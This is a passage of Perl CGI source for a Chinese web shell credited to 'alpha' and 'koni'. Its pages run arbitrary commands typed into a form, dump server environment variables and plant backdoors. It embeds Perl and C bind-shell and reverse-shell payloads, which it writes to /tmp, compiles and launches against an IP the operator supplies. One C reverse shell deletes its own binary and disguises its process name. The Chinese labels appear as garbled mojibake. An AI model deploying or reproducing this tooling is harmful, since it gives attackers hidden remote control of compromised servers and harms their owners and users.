       FONT-SIZE: "12px";
       COLOR: "#000000";
       BACKGROUND-COLOR: "#FFFFFF";
       height: "18px";
       border: "1px solid #666666";
   }
       A:link {text-decoration:underline;color:$c2}
       A:visited {text-decoration:underline;color:$c1;}
       A:active {text-decoration:none;color:$c7;background-color:$c6;}
       A:hover {text-decoration:none;color:$c7;background-color:$c6;}
   </STYLE>

   </HEAD>
   <BODY  MARGINWIDTH=0 MARGINHEIGHT=0 LEFTMARGIN=0 RIGHTMARGIN=0 TOPMARGIN=0 BOTTOMMARGIN=0 TEXT=000000 LINK=$c2 ALINK=FF0000 VLINK=$c1 onLoad="document.adminpro.test.focus();$disablechmod">
   <BASEFONT SIZE=2><A NAME="top"></A>$fnt1

   <center><table width=760 bgcolor="#FFFFFF" cellspacing="1" border="0" cellpadding="3">
   <tr ><td align=right><font color="red">OS: $os</font></td></tr>
   <tr bgcolor="#E0E0EE" width=100% align=center><td><B>$fnt1 CGI HTTP SHELL OF KONI & ALPHA </B></a></font></td></tr>
   <tr bgcolor=""><td align=center bgcolor="#cccccc"><a href=?action=4>ÍË³öµÇÂ½</a> | <a href= ?>ÎÄ¼þä¯ÀÀ</a> | <a href=?action=1>webshell</a> | <a href=?action=2>»·¾³±äÁ¿</a> | <a href=?action=3>ÏµÍ³ºóÃÅ</a> | <a href="http://www.securitfaq.com" target="a_blank">ÐÂ°æ±¾</a></td></tr>
   <tr bgcolor="#E7E7E7"><td>$fnt1&nbsp;µ±Ç°³ÌÐò£º$filepat</td></tr>
   <tr bgcolor="#E7E7E7"><td>$fnt1&nbsp;µ±Ç°Ä¿Â¼£º$path</td></tr>
   <tr bgcolor="#E7E7E7"><form action="" method="GET">
   <td>$fnt1 &nbsp;Ìø×ªµ½&nbsp;&nbsp;£º
           <input type="hidden" name="dispath" value="1" >
           <input type="hidden" name="run" value="yes" >
           <input name="path" type="text" value="$path" size="40" class="input">
           <input type="submit"  value="È·¶¨" class="input">
    </font></td></form></tr>
       <tr></tr>
       <tr><td><hr></td></tr>
       <tr><td align=center ><font color=red  ><B>Code by <a href="mailto:netsh\@163.com">alpha</a> \@ cnwill of China,Welcome to <a href="http://www.securitfaq.com" target="a_blank">www.securitfaq.com</a>!</B></td></tr>
   </table>
   </center>
   Head

   @a=localtime();
   if(@a[2]<7||@a[2]>19)
       {$msg="Safe time";
   }
   else{$msg="Working time!";
   }

   #Ò³Î²
   $foot1=<<Foot;
   </table><center><hr width="760" noshade>
   <table width="760" border="0" cellpadding="0" >
     <tr>
       <td><B>Copyright (C) 2004~2005 Alpha ³öÆ·</B></td><td><b><font color=red>Now: @a[2]:@a[1]:@a[0] $msg</font></B><td>
       <td align="right">Don't ask me who is koni ^_^ </td>
     </tr>
   Foot
   }


   ###############################
   ##shell²¿·Ö
   sub cmd{
   $title="webshell";
   &head;
   $_ = $t{"cmd"};
   s/\+/ /ig;
   s/%20/ /ig;
   s/%2f/\//ig;
   s/%3A/:/ig;
   s/%5C/\\/ig;
   $exec = $_;
   open(STDERR, ">&STDOUT") || die "Can't redirect STDERR";

   print "$head";
   print "<center><table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">\n";
   print "<tr> <td align=\"center\" bgcolor=\"#E0E0EE\"><B>WebShell </B></td></tr>\n";
   print "<form action=\"\" method=\"post\">\n";
   print "<tr><td bgcolor=\"#E0E0E0\" align=\"center\"><font  color=\"#006600\">ÊäÈëÖ¸Áî£º</font><input type=\"hidden\" name=action value=\"1\"><input type=\"text\" name=\"cmd\" value=\"$_\" size=80 class=\"input\">&nbsp;<input type=submit value=\"È·¶¨\" class=\"input\">\n";
   print "</td></tr></form>\n";

   print "<tr><td bgcolor=\"#E0E0E7\" align=\"center\"><textarea name=\"textarea\" cols=\"101\" rows=\"25\" readonly>\n";
   system($exec);
   print "</textarea></td></tr></table></center>\n";
   print "$foot1 </center>";
   print "</font></body></HTML>\r\n";
   close(STDERR);
   exit;
   }


   ###############################
   ##»·¾³±äÁ¿
   sub env{
   $title="»·¾³±äÁ¿";
   &head;
   print "Content-type: text/html\n\n";
   print <<"Env";
   $head;
   <CENTER>
   <table width=760 border=0 CELLPADDING=3 CELLSPACING=1>

   <TR bgcolor=#CCCCCC align=center><TD ><B>$ENV{'GATEWAY_INTERFACE'} ²ÎÊý²âÊÔ</B></td></tr></table>
   <table width=760 border=0 CELLPADDING=1 CELLSPACING=1>
   <tr bgcolor=#E0E0EF><td align=center><FONT FACE=Fixedsys COLOR=red>Perl ²ÎÊý±äÁ¿</FONT></td><td align=center><FONT FACE=Fixedsys COLOR=red>²ÎÊýÖµ</FONT></td></tr>
   </FONT></td></tr>
   Env

   foreach $env (sort keys %ENV){
     print "<tr bgcolor=#E0E0E7><td><FONT FACE=Fixedsys >$env</FONT></td><td><FONT FACE=Fixedsys>\n";
     if($ENV{$env}){
       print "$ENV{$env}";
     }else{
       print "&nbsp;";
     }
     print "</FONT></td></tr>\n";
   }

   print "</table></center>$foot1</center></BODY></HTML>";
   exit;
   }

   ################################
   ##backdoor²¿·Ö
   sub backdoor
   {
   $title="ÏµÍ³ºóÃÅ";
   &head;
   $title1=$title;

   $doorp=<<Doorp;
   #!/usr/bin/perl
   \$SHELL="/bin/bash -i";
   if (\@ARGV < 1) { exit(1); }
   \$LISTEN_PORT=\$ARGV[0];
   use Socket;
   \$protocol=getprotobyname('tcp');
   socket(S,&PF_INET,&SOCK_STREAM,\$protocol) || die "Cant create socket\\n";
   setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);
   bind(S,sockaddr_in(\$LISTEN_PORT,INADDR_ANY)) || die "Cant open port\\n";
   listen(S,3) || die "Cant listen port\\n";
   while(1)
   {
   accept(CONN,S);
   if(!(\$pid=fork))
   {
   die "Cannot fork" if (!defined \$pid);
   open STDIN,"<&CONN";
   open STDOUT,">&CONN";
   open STDERR,">&CONN";
   exec \$SHELL || die print CONN "Cant execute \$SHELL\\n";
   close CONN;
   exit 0;
   }
   }
   Doorp

   $doorc=<<Doorc;
   #include <stdio.h>
   #include <string.h>
   #include <sys/types.h>
   #include <sys/socket.h>
   #include <netinet/in.h>
   #include <errno.h>
   int main(argc,argv)
   int argc;
   char **argv;
   {
    int sockfd, newfd;
    char buf[30];
    struct sockaddr_in remote;
    if(fork() == 0) {
    remote.sin_family = AF_INET;
    remote.sin_port = htons(atoi(argv[1]));
    remote.sin_addr.s_addr = htonl(INADDR_ANY);
    sockfd = socket(AF_INET,SOCK_STREAM,0);
    if(!sockfd) perror("socket error");
    bind(sockfd, (struct sockaddr *)&remote, 0x10);
    listen(sockfd, 5);
    while(1)
     {
      newfd=accept(sockfd,0,0);
      dup2(newfd,0);
      dup2(newfd,1);
      dup2(newfd,2);
      write(newfd,"Password:",10);
      read(newfd,buf,sizeof(buf));
      if (!chpass(argv[2],buf))
      system("echo welcome  shell && /bin/bash -i");
      else
      fprintf(stderr,"Sorry");
      close(newfd);
     }
    }
   }
   int chpass(char *base, char *entered) {
   int i;
   for(i=0;i<strlen(entered);i++)
   {
   if(entered[i] == '\\n')
   entered[i] = '\\0';
   if(entered[i] == '\\r')
   entered[i] = '\\0';
   }
   if (!strcmp(base,entered))
   return 0;
   }
   Doorc

   $backp=<<Backp;
   #!/usr/bin/perl
   use Socket;
   \$cmd= "lynx";
   \$system= 'echo "`uname -a`";echo "`id`";/bin/sh';
   \$0=\$cmd;
   \$target=\$ARGV[0];
   \$port=\$ARGV[1];
   \$iaddr=inet_aton(\$target) || die("Error: \$!\\n");
   \$paddr=sockaddr_in(\$port, \$iaddr) || die("Error: \$!\\n");
   \$proto=getprotobyname('tcp');
   socket(SOCKET, PF_INET, SOCK_STREAM, \$proto) || die("Error: \$!\\n");
   connect(SOCKET, \$paddr) || die("Error: \$!\\n");
   open(STDIN, ">&SOCKET");
   open(STDOUT, ">&SOCKET");
   open(STDERR, ">&SOCKET");
   system(\$system);
   close(STDIN);
   close(STDOUT);
   close(STDERR);
   Backp

   $backc=<<Backc;
   #include <stdio.h>
   #include <sys/socket.h>
   #include <netinet/in.h>
   int main(int argc, char *argv[])
   {
    int fd;
    struct sockaddr_in sin;
    char rms[21]="rm -f ";
    daemon(1,0);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2]));
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    bzero(argv[1],strlen(argv[1])+1+strlen(argv[2]));
    fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) ;
    if ((connect(fd, (struct sockaddr *) &sin, sizeof(struct sockaddr)))<0) {
      perror("[-] connect()");
      exit(0);
    }
    strcat(rms, argv[0]);
    system(rms);
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);
    execl("/bin/sh","sh -i", NULL);
    close(fd);
   }
   Backc

   $wdoorp=$doorp;
   $wdoorp=~s/\/bin\/bash -i/cmd.exe/;

   $wbackp=$backp;
   $wbackp=~s/echo "`uname -a`";echo "`id`";\/bin\/sh/cmd.exe/g;
   ####
   #6¸öbackdoor´úÂë½áÊø£¬ºóÃÅÆô¶¯²¿·Ö¿ªÊ¼

   if(($ENV{SERVER_SOFTWARE}=~/Win32/)||($ENV{SERVER_SOFTWARE}=~/Microsoft/))
   {if ($t{'port'}&&$t{'bind_pass'}&&($t{'use'}=="1"))
   {
    open(FILE,">$wpath/test.pl");
    print FILE $wdoorp;
    close(FILE);

    $bind_string="$wpath/test.pl ".$t{'port'}." &";
    $blah=system($bind_string);
    $title1="ºóÃÅÒÑ´ò¿ª.......";

     }

   # back connect Perl
   if ($t{'ip'} && $t{'port'} && ($t{'use'}=="1"))
   {
    open(FILE,">$wpath/testb.pl");
    print FILE $wbackp;
    close(FILE);

    $bc_string="$wpath/testb.pl ".$t{'ip'}." ".$t{'port'}." &";
    $blah=system($bc_string);
    $title1="Õý·´ÏòÁ¬½Óµ½$t{'ip'}......."


   }
   }
   else
   {

   if ($t{'port'}&&$t{'bind_pass'}&&($t{'use'}=="2"))
   {
    open(FILE,">/tmp/testaa.c");
    print FILE $doorc;
    close(FILE);

    $blah=system("gcc -o /tmp/bd /tmp/testaa.c");
    unlink("/tmp/testaa.c");
    $bind_string="/tmp/bd ".$t{'port'}." ".$t{'bind_pass'}." &";
    $blah=system($bind_string);
    $title1="ºóÃÅÒÑ´ò¿ª.......";
    }

   # port bind Perl
   if ($t{'port'}&&$t{'bind_pass'}&&($t{'use'}=="1"))
   {
    open(FILE,">/tmp/testtest.pl");
    print FILE $doorp;
    close(FILE);

    $bind_string="perl /tmp/testtest.pl ".$t{'port'}." &";
    $blah=system($bind_string);
    $title1="ºóÃÅÒÑ´ò¿ª.......";

     }

   # back connect Perl
   if ($t{'ip'} && $t{'port'} && ($t{'use'}=="1"))
   {
    open(FILE,">/tmp/testb.pl");
    print FILE $backp;
    close(FILE);

    $bc_string="perl /tmp/testb.pl ".$t{'ip'}." ".$t{'port'}." &";
    $blah=system($bc_string);
    $title1="Õý·´ÏòÁ¬½Óµ½$t{'ip'}......."

   }

   # back connect C
   if ($t{'ip'} && $t{'port'} && ($t{'use'}=="2"))
   {
   open(FILE,">/tmp/testb.c");
   print FILE $backc;
   close(FILE);

    $blah=system("gcc -o /tmp/backc /tmp/testb.c");
    unlink("/tmp/testb.c");
    $bc_string="/tmp/backc ".$t{'ip'}." ".$t{'port'}." &";
    $blah=system($bc_string);
   $title1="Õý·´ÏòÁ¬½Óµ½$t{'ip'}......."


   }


   }

   print "Content-type: text/html\n\n";

   print<<Backdoor;
   $head
   <table width=760  cellspacing=0  align=center cellpadding="3">
   <tr align=center><td  bgcolor=#CCCCCC><font face=Verdana><b><div align=center>:: $title1 ::</div></b></font></td></tr>
   <tr align=center><td bgcolor=#E0E0EF><font face=Verdana><b><div align=center>:: ÕýÏòÁ¬½ÓºóÃÅ ::</div></b></font></td></tr>
   <tr><td bgcolor=#E0E0E0 align=center><form name=bind method=get>
   <font face=Verdana ><b>Port:</b>
   <input type=text name=port size=15 value=9999 class="input">&nbsp;&nbsp;<b>Password : </b>
   <input type=text name=bind_pass size=15 value=alpha class="input">&nbsp;&nbsp;<b> Use :
       <select size="1" name="use">
       <option value="1">Perl</option><option value="2">C</option>
       </select>
       <input type=hidden name=dir value=$path >
       <input type=hidden name=action value=3>
       <input type=submit name=submit value=" Bind " class="input"></font></form></td></tr>
       <tr><td bgcolor=#E0E0EF><font face=Verdana>
   <b><div align=center>:: ·´ÏòÁ¬½ÓºóÃÅ ::</div></b></font></td></tr>
       <tr><td bgcolor=#E0E0E7 align=center><form name=back method=get><font face=Verdana ><b>IP:</b>
       <input type=text class="input" name=ip size=15 value=$ENV{REMOTE_ADDR} ><b>&nbsp;&nbsp;&nbsp;Port&nbsp;:&nbsp;</B>
   <input type=text name=port size=15 value=9999 class="input"><b>&nbsp;&nbsp;&nbsp;Use&nbsp;:&nbsp;</B>
       <select size="1" name="use">
       <option value="1">Perl</option><option value="2" >C</option>
       </select>
       <input type=hidden name=dir value=$path>
       <input type=hidden name=action value=3>
       <input type=submit name=submit value=" Connect " class="input">
       </font></form></td></tr>
           <tr><td bgcolor=#E0E0EF><font color=red>×¢:windowsÏµÍ³Ö»ÄÜÊ¹ÓÃperl·½Ê½µÄºóÃÅ£¬*nixÏµÍ³¿ÉÒÔÊ¹ÓÃËùÓÐ¹¦ÄÜ!</font></td></tr>
       </font></table>
       $foot1
       </center></body></html>
   Backdoor


   ###############
   exit;
   }

   1;
   exit;

   #Õû¸ö³ÌÐò½áÊø
